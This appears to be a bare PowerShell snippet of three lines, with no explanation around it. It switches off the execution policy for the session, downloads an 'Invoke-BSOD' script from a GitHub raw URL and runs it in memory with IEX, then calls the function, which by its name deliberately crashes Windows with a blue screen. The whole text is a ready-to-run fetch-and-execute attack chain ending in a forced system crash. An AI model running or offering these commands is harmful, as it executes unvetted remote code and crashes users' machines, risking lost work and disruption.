Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
IEX ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'))
Invoke-BSOD
